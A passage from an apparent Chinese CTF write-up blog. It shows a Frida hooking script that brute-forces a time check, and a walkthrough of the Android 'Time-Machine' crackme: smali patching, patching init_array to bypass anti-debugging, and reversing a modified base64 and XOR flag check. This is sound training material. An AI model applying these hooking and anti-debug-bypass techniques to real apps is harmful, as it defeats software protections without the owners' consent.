class="built_in">this</span>.second.value = <span class="number">23</span>;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="built_in">this</span>.hour.value, <span class="built_in">this</span>.minute.value, <span class="built_in">this</span>.second.value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> LoginActivityKt = Java.use(<span class="string">&quot;com.flag.reverse.c.ui.login.LoginActivityKt&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> intrics = Java.use(<span class="string">&quot;kotlin.jvm.internal.Intrinsics&quot;</span>);</span><br><span class="line">intrics.areEqual.overload(<span class="string">&quot;java.lang.Object&quot;</span>, <span class="string">&quot;java.lang.Object&quot;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">s1, s2</span>)</span>&#123;</span><br><span class="line"><span class="comment">// console.log(s1,s2);</span></span><br><span class="line"><span class="keyword">if</span>(s1 == s2)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;into areEqual() args=&quot;</span>, s1, s2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.areEqual(s1, s2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> stop = <span class="literal">false</span>;</span><br><span class="line">LoginActivityKt.encodeMD5.overload(<span class="string">&quot;java.lang.String&quot;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">plain</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> hashstr = <span class="built_in">this</span>.encodeMD5(plain);</span><br><span class="line"><span class="keyword">if</span>(hashstr == <span class="string">&quot;1a9852e856816224&quot;</span>)&#123; </span><br><span class="line">stop = <span class="literal">true</span>;</span><br><span class="line"><span class="built_in">console</span>.log(plain);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> hashstr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LoginActivityClass.updateUiWithUser.overload(<span class="string">&quot;com.flag.reverse.c.ui.login.LoggedInUserView&quot;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">v</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> last_v;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> h=<span class="number">0</span>;h&lt;=<span class="number">24</span>;h++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> m=<span class="number">0</span>;m&lt;=<span class="number">60</span>;m++)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(h,m);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> s=<span class="number">0</span>;s&lt;=<span class="number">60</span>;s++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!stop)&#123;</span><br><span class="line"><span class="built_in">this</span>.hour.value = h;</span><br><span class="line"><span class="built_in">this</span>.minute.value = m;</span><br><span class="line"><span class="built_in">this</span>.second.value = s;</span><br><span class="line">last_v = <span class="built_in">this</span>.updateUiWithUser(v);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">this</span>.hour.value, <span class="built_in">this</span>.minute.value, <span class="built_in">this</span>.second.value);</span><br><span class="line"><span class="keyword">return</span> last_v;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure><h1 id="Time-Machine"><a href="#Time-Machine" class="headerlink" title="Time-Machine"></a>Time-Machine</h1><blockquote><p><a href="https://github.com/slient2009/PicGo/blob/main/files/HUAWEI-CTF-%E9%A2%98%E7%9B%AE%E9%99%84%E4%BB%B6.zip">华为内部CTF</a></p></blockquote><p>这道题做得比较久，中途基本想放弃了，不过还是坚持做下来了，值得给自己点赞。（雾</p><p>首先看一下Java层，还好没有太多逻辑需要厘清。<br>要求先后点击两个按钮并获取点击时间，要求第一个时间戳大于第二个时间戳，显然这是不能实现的。（对应题目的名字Time Machine）<br>可以通过Frida Hook时间类，或者直接修改smali代码，把大于改成小于即可。为了后续IDA动态调试方便，我选择了后者。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;native-lib&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// androidx.appcompat.app.AppCompatActivity</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle arg7)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(arg7);</span><br><span class="line">        <span class="keyword">this</span>.setContentView(<span class="number">0x7F0A001C</span>);  <span class="comment">// layout:activity_main</span></span><br><span class="line">        Button startButton = (Button)<span class="keyword">this</span>.findViewById(<span class="number">0x7F070042</span>);  <span class="comment">// id:button</span></span><br><span class="line">        Button stopButton = (Button)<span class="keyword">this</span>.findViewById(<span class="number">0x7F070043</span>);  <span class="comment">// id:button2</span></span><br><span class="line">        <span class="keyword">long</span>[] startTime = <span class="keyword">new</span> <span class="keyword">long</span>[]&#123;<span class="number">0L</span>&#125;;</span><br><span class="line">        <span class="keyword">long</span>[] endTime = <span class="keyword">new</span> <span class="keyword">long</span>[]&#123;<span class="number">0L</span>&#125;;</span><br><span class="line">        startButton.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span>  <span class="comment">// android.view.View$OnClickListener</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg4)</span> </span>&#123;</span><br><span class="line">                startTime[<span class="number">0</span>] = System.currentTimeMillis();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        stopButton.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span>  <span class="comment">// android.view.View$OnClickListener</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg7)</span> </span>&#123;</span><br><span class="line">                endTime[<span class="number">0</span>] = System.currentTimeMillis();</span><br><span class="line">                <span class="keyword">long</span>[] v7 = startTime;</span><br><span class="line">                <span class="keyword">if</span>(v7[<span class="number">0</span>] == <span class="number">0L</span>) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">&quot;game not start &quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">long</span> startTime2 = v7[<span class="number">0</span>];</span><br><span class="line">                String endTime2 = endTime[<span class="number">0</span>] + <span class="string">&quot; &quot;</span>;</span><br><span class="line">                <span class="keyword">if</span>(startTime2 - endTime[<span class="number">0</span>] &gt; <span class="number">1L</span>) &#123; <span class="comment">//不修改或者调试过不了的条件</span></span><br><span class="line">                    Bundle timeString = <span class="keyword">new</span> Bundle();</span><br><span class="line">                    timeString.putString(<span class="string">&quot;starttime&quot;</span>, startTime2 + <span class="string">&quot; &quot;</span>);</span><br><span class="line">                    timeString.putString(<span class="string">&quot;endtime&quot;</span>, endTime2);</span><br><span class="line">                    Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">                    intent.setClass(MainActivity.<span class="keyword">this</span>, Main2Activity.class);</span><br><span class="line">                    intent.putExtras(timeString);</span><br><span class="line">                    MainActivity.<span class="keyword">this</span>.startActivity(intent);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就输入flag并进行检查。<br>要求flag长度为42，格式为<code>flag&#123;xxxxx&#125;</code>，flag前三位是<code>e25</code>，第三到第八位的md5值为<code>1E862D87DB3293B81C7D2934577A22FA</code>，用<code>somd5</code>解出来是<code>be952</code>。<br>然后把flag剩余的部分交给check函数传到native层去检查。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        <span class="keyword">this</span>.setContentView(<span class="number">0x7F0A001D</span>);  <span class="comment">// layout:activity_main2</span></span><br><span class="line">        Bundle v3 = <span class="keyword">this</span>.getIntent().getExtras();</span><br><span class="line">        v0.toString();</span><br><span class="line">        v3.getString(<span class="string">&quot;endtime&quot;</span>);</span><br><span class="line">        EditText mEditText = (EditText)<span class="keyword">this</span>.findViewById(<span class="number">0x7F070056</span>);  <span class="comment">// id:editText</span></span><br><span class="line">        ((Button)<span class="keyword">this</span>.findViewById(<span class="number">0x7F070044</span>)).setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;  <span class="comment">// id:button3</span></span><br><span class="line">            <span class="meta">@Override</span>  <span class="comment">// android.view.View$OnClickListener</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg6)</span> </span>&#123;</span><br><span class="line">                String inputFlag = mEditText.getText().toString();</span><br><span class="line">                <span class="keyword">if</span>(inputFlag.length() != <span class="number">42</span>) &#123;</span><br><span class="line">                    Toast.makeText(Main2Activity.<span class="keyword">this</span>, <span class="string">&quot;Wrong！！！&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>((inputFlag.substring(<span class="number">0</span>, <span class="number">5</span>).equals(<span class="string">&quot;flag&#123;&quot;</span>)) &amp;&amp; (inputFlag.substring(<span class="number">41</span>).equals(<span class="string">&quot;&#125;&quot;</span>))) &#123;</span><br><span class="line">                    String flagStr = inputFlag.substring(<span class="number">5</span>, <span class="number">41</span>);</span><br><span class="line">                    <span class="keyword">if</span>((flagStr.substring(<span class="number">0</span>, <span class="number">3</span>).equals(<span class="string">&quot;e25&quot;</span>)) &amp;&amp; (Main2Activity.<span class="keyword">this</span>.md5(flagStr.substring(<span class="number">3</span>, <span class="number">8</span>)).equals(<span class="string">&quot;1E862D87DB3293B81C7D2934577A22FA&quot;</span>))) &#123;</span><br><span class="line">                        Toast.makeText(Main2Activity.<span class="keyword">this</span>, Main2Activity.<span class="keyword">this</span>.Check(flagStr.substring(<span class="number">8</span>)), <span class="number">0</span>).show();</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(Main2Activity.<span class="keyword">this</span>, <span class="string">&quot;wrong~~&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>IDA分析so文件，本着一直以来的习惯先检查<code>init_array</code>和<code>JNI_onload</code>。<br><code>init_array</code>有三个函数，其中一个使用了<code>pthread_create_key</code>，看起来好像没有反调试代码，但是真要IDA动态调试会退出，所以把它们patch过掉。</p><p>事实上目前笔者对于如何优雅地patch init_array还是不大了解。<br>之前尝试过直接修改init_array中元素值为0x0000，但是后面打包安装会出错；也尝试过在函数内部插入POP指令直接返回，但是没有处理好堆栈还是出问题了；这里是把init_array中的值修改为一个无关函数的起始地址来patch掉检测代码的。</p><p>过掉反检测代码，检查JNI_onload中的动态注册操作，比较简单，就是把sub_8ED24CF8()函数注册为check()函数。<br>在sub_8ED24CF8中，ooo000()函数先把传进来的flag做一遍base64编码，然后check()函数把编码后的数组进行抑或并与目标数组比较。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_8ED24CF8</span><span class="params">(JNIEnv *env, <span class="keyword">int</span> jthiz, <span class="keyword">int</span> inputFlag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v6; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *flag_base64; <span class="comment">// [sp+0h] [bp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v10[<span class="number">8</span>]; <span class="comment">// [sp+4h] [bp-14h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v4 = (*env)-&gt;GetStringUTFChars(env, inputFlag, <span class="number">0</span>);</span><br><span class="line">  ooo000(&amp;flag_base64, v4);<span class="comment">// 换表base64编码</span></span><br><span class="line">  v5 = check(flag_base64);<span class="comment">// 抑或校验</span></span><br><span class="line">  v6 = <span class="string">&quot;tql!!!!&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">1</span> )</span><br><span class="line">    v6 = <span class="string">&quot;啊这。。&quot;</span>;</span><br><span class="line">  v7 = ((*env)-&gt;NewStringUTF)(env, v6, <span class="string">&quot;啊这。。&quot;</span>);</span><br><span class="line">  sub_8ED27710(flag_base64 - <span class="number">12</span>, v10);</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看ooo000()函数，代码中出现了相当明显的base64算法，更换了base64映射表。<br>注意<code>appendString(retString, base64table[*(int6_4 + ind) ^ (*(int6_4 + ind) &gt;&gt; 3)]);</code>这段代码。<br>常规的base64，把3个byte转换为4个int6之后，直接把base64table[int6]追加到密文字符串之后就行了。<br>这里加了一点处理，追加的是base64table[ int6 ^ (int6&gt;&gt;3) ]。<br>好在这个过程是可逆的，反过来是:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index = base64table.index(base64cipher[i])</span><br><span class="line">int6 = (index  &amp; <span class="number">0x38</span>) | ((index&gt;&gt;<span class="number">3</span>) ^ (index&amp;<span class="number">0x7</span>))</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">ooo000</span><span class="params">(<span class="keyword">char</span> *retString, <span class="keyword">const</span> <span class="keyword">char</span> *flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">size_t</span> v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// r10</span></span><br><span class="line">  <span class="keyword">int</span> ind; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v8; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v9; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v10; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v13; <span class="comment">// r10</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v14; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v16; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v17; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">int</span> int6_4[<span class="number">10</span>]; <span class="comment">// [sp+8h] [bp-28h]</span></span><br><span class="line"></span><br><span class="line">  int6_4[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v4 = sub_8ED28214(retString, &amp;unk_8ED370CE);</span><br><span class="line">  sub_8ED24488(v4);</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(flag);</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt; <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      ind = <span class="number">0</span>;</span><br><span class="line">      v8 = flag[<span class="number">3</span> * v6];</span><br><span class="line">      v9 = &amp;flag[<span class="number">3</span> * v6];</span><br><span class="line">      LOBYTE(int6_4[<span class="number">0</span>]) = v8 &gt;&gt; <span class="number">2</span>;</span><br><span class="line">      v10 = v9[<span class="number">1</span>];</span><br><span class="line">      BYTE1(int6_4[<span class="number">0</span>]) = (<span class="number">16</span> * v8) &amp; <span class="number">0x30</span> | (v10 &gt;&gt; <span class="number">4</span>);</span><br><span class="line">      v11 = *(v9 + <span class="number">2</span>);</span><br><span class="line">      BYTE2(int6_4[<span class="number">0</span>]) = (v11 &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0xC3</span> | (<span class="number">4</span> * (v10 &amp; <span class="number">0xF</span>));</span><br><span class="line">      HIBYTE(int6_4[<span class="number">0</span>]) = v11 &amp; <span class="number">0x3F</span>;<span class="comment">// 相当明显的base64操作</span></span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        appendString(retString, base64table[*(int6_4 + ind) ^ (*(int6_4 + ind) &gt;&gt; <span class="number">3</span>)]);</span><br><span class="line">        ++ind;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( ind &lt; <span class="number">4</span> );</span><br><span class="line">      v5 = <span class="built_in">strlen</span>(flag);</span><br><span class="line">      ++v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v6 &lt; v5 / <span class="number">3</span> );</span><br><span class="line">    v12 = <span class="number">3</span> * v6;</span><br><span class="line">  &#125;</span><br><span class="line">  v13 = v5 % <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v5 % <span class="number">3</span> )                                 <span class="comment">// 这里在补上==或=</span></span><br><span class="line">  &#123;</span><br><span class="line">    v14 = flag[v12];</span><br><span class="line">    v15 = (<span class="number">16</span> * v14) &amp; <span class="number">0x30</span>;</span><br><span class="line">    LOBYTE(int6_4[<span class="number">0</span>]) = flag[v12] &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    v16 = v15 | (flag[v12 + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>);</span><br><span class="line">    BYTE1(int6_4[<span class="number">0</span>]) = v15 | (flag[v12 + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>);</span><br><span class="line">    appendString(retString, base64table[(v14 &gt;&gt; <span class="number">5</span>) ^ (v14 &gt;&gt; <span class="number">2</span>)]);</span><br><span class="line">    appendString(retString, base64table[v16 ^ (v16 &gt;&gt; <span class="number">3</span>)]);</span><br><span class="line">    <span class="keyword">if</span> ( (v13 &amp; <span class="number">3</span>) == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v17 = (<span class="number">4</span> * flag[v12 + <span class="number">1</span>]) &amp; <span class="number">0x3C</span>;</span><br><span class="line">      v18 = v17 | (flag[v12 + <span class="number">2</span>] &gt;&gt; <span class="number">6</span>);</span><br><span class="line">      BYTE2(int6_4[<span class="number">0</span>]) = v17 | (flag[v12 + <span class="number">2</span>] &gt;&gt; <span class="number">6</span>);</span><br><span class="line">      appendString(retString, base64table[v18 ^ (v17 &gt;&gt; <span class="number">3</span>)]);</span><br><span class="line">      sub_8ED26168(retString, <span class="string">&quot;=&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( (v13 &amp; <span class="number">3</span>) == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_8ED26168(retString, <span class="string">&quot;==&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> _stack_chk_guard - int6_4[<span class="number">2</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是得到一个<code>base64bytes</code>数组，在check函数中对它进行校验。<br>看起来这里的校验逻辑非常复杂，但是不需要一一厘清，只需要关注有意义的那两行代码就好。<br>根据经验加一点点合理的推测，就是先使用xor_key数组把刚刚得到的base64bytes数组抑或成bytesAfterXor数组，然后和aimBytes比较是否一致。<br>aimBytes数组的可以直接提取，xor_key存在于bss段，需要确定生成逻辑。但是因为我是动态调试的，所以直接从内存里面dump出来的。<br>有了这两个数据的具体值，可以还原base64bytes，再根据base64算法，可以还原出flag。<br>代码在最后。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">check</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *base64bytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// r10</span></span><br><span class="line">  <span class="keyword">int</span> lens; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// lr</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [sp+4h] [bp-D4h]</span></span><br><span class="line">  <span class="keyword">int</span> ind; <span class="comment">// [sp+Ch] [bp-CCh]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [sp+10h] [bp-C8h]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [sp+14h] [bp-C4h]</span></span><br><span class="line">  <span class="keyword">int</span> aimBytes[<span class="number">40</span>]; <span class="comment">// [sp+18h] [bp-C0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  qmemcpy(aimBytes, off_8ED37180, <span class="keyword">sizeof</span>(aimBytes));</span><br><span class="line">  lens = <span class="built_in">strlen</span>(base64bytes);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; i = v15 + <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">517013752</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v5 == <span class="number">517013752</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v15 = i;</span><br><span class="line">      v5 = 